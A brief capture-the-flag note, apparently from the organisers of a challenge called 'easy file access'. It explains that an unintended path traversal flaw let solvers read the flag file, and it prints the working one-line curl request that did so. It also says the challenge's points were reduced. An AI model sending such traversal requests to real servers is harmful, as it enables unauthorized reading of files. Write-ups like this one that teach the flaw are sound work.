# easy file access

This ended up being a unintended solution, path traversal was turned on and a simple exploit like

`curl -g --path-as-is "http://easy-file-access.tghack.no:1337/uploads/../flag.txt"` worked.

We reduced this challenge's points and released easy-file-access 2 where the real exploit is explained
